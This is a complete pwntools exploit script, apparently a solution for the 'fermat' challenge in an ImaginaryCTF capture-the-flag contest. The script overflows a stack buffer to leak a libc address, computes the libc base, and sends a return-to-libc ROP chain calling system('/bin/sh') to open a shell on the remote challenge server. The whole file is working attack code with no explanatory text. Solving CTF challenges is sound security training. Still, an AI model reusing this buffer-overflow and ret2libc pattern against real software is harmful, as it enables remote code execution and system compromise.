from pwn import *
from icecream import ic

elf = exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("fermat.chal.imaginaryctf.org", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x0000000000001273
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

payload = b'a'*260
payload += b'bbbb'
payload += b'\x23'
s(payload)

ru("bbbb")
libc.address = u64(re(6).ljust(8, b'\x00')) - 0x29d23

pop_rdi = libc.address + 0x000000000002a3e5
binsh = libc.address + 0x1d8698
ret = libc.address + 0x00000000000f99ab
system = libc.sym['system']
ic(hex(libc.address))

payload = b'a'*264
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)
s(payload)

io.interactive()
